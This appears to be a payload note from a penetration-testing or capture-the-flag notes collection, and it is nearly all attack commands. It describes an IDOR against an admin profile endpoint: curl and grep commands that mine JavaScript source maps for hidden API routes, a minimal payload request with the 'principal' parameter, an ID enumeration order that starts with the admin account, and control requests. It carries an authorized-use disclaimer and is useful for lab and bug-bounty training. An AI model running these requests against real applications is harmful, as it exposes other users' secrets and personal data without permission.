# Admin Profile Principal Query IDOR

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when:

- login yields a valid authenticated session
- the primary profile endpoint derives identity from session (`/api/me` or `/api/v1/user/me`)
- recon (especially source maps) reveals an admin/team profile lookup with a query param such as `principal`, `userId`, or `uid`
- the response includes sensitive fields such as `secret`, `notes`, or `email`

## Discovery Via Source Map

```bash
curl -sS 'https://[host]/js/app.bundle.js.map' \
  | jq -r '.sources[], (.sourcesContent // [])[]' \
  | grep -E '/api/|principal|secret|AdminInfo|teamMember'
```

Typical documented shape:

```text
GET /api/v1/admin/profile?principal=<numeric user id>
→ { id, username, name, email, title, secret }
```

## Minimal Payload

```bash
curl -sS -b cookies.txt \
  'https://[host]/api/v1/admin/profile?principal=1'
```

Related path-style variant (older Acme packaging):

```bash
curl -sS -b cookies.txt 'https://[host]/api/teamMemberInfo/1'
```

## Enumeration Order

```text
1          # UI hint: Mira (#1, admin)
self_id
self_id±1
2, 3, 4...
```

## Control Requests

```bash
curl -sS -b cookies.txt 'https://[host]/api/v1/user/me'
curl -sS -b cookies.txt 'https://[host]/api/v1/admin/profile?principal=[self_id]'
curl -sS 'https://[host]/api/v1/admin/profile'   # often generic 403 if param missing
```

## Why It Works

The alternate endpoint authenticates the caller but authorizes using only the supplied id/principal, without verifying ownership or admin role.

## Why It Fails

- Endpoint ignores the query id and uses session identity
- Sensitive fields omitted for non-owners
- Admin role required in addition to authentication
- Missing param and unauthorized id are indistinguishable

## Common Mistakes

- Stopping after session-tied `/me` looks airtight
- Skipping `.js.map` when the UI ships a single minified bundle
- Searching only for `id` / `userId` and missing `principal`
- Storing live flags in reusable payload files

## Related

- `payloads/idor/team-member-info-id-enumeration.md`
- `notes/session-secured-endpoint-idor-bypass.md`
- `notes/source-maps-and-hidden-endpoints.md`
- `writeups/acme-intranet-session-tied-idor.md`
